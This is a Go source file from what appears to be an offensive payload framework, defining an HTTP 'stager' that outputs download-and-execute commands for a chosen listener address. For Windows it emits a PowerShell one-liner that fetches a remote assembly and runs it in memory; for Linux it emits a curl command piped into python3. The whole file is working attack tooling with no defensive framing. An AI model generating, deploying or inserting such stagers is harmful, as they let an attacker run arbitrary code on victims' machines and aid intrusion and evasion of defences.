// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2025 kdsmith18542

package stagers

import (
	"fmt"
	"github.com/kdsmith18542/pwny/internal/payload"
)

type HTTPStager struct{}

func (g *HTTPStager) Generate(opts payload.PayloadOptions) ([]byte, error) {
	if opts.LHOST == "" || opts.LPORT == 0 {
		return nil, fmt.Errorf("LHOST and LPORT are required for HTTP stager")
	}

	switch opts.Platform {
	case payload.PlatformWindows:
		return g.generateWindows(opts)
	case payload.PlatformLinux:
		return g.generateLinux(opts)
	default:
		return nil, fmt.Errorf("unsupported platform for HTTP stager: %s", opts.Platform)
	}
}

func (g *HTTPStager) generateWindows(opts payload.PayloadOptions) ([]byte, error) {
	// Simple PowerShell-based HTTP downloader/executor stager
	url := fmt.Sprintf("http://%s:%d/stage", opts.LHOST, opts.LPORT)
	script := fmt.Sprintf("$c = New-Object System.Net.WebClient; $b = $c.DownloadData('%s'); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null, $null)", url)
	
	return []byte(script), nil
}

func (g *HTTPStager) generateLinux(opts payload.PayloadOptions) ([]byte, error) {
	// Simple curl/python-based HTTP downloader/executor stager
	url := fmt.Sprintf("http://%s:%d/stage", opts.LHOST, opts.LPORT)
	script := fmt.Sprintf("curl -sL %s | python3 -", url)
	
	return []byte(script), nil
}

func init() {
	payload.GlobalRegistry.RegisterStager("multi/http", &HTTPStager{})
}
